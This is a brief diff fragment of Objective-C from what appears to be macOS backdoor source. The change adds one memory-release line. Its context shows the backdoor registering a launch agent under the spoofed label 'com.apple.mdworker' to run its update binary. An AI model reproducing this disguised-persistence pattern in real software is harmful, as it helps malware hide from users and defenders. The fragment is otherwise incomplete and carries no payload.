@@ -78,6 +78,8 @@
 #endif
     }
   
+  [backdoorLaunchAgent release];
+  
   success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
                                 forBinary: gBackdoorUpdateName];
   
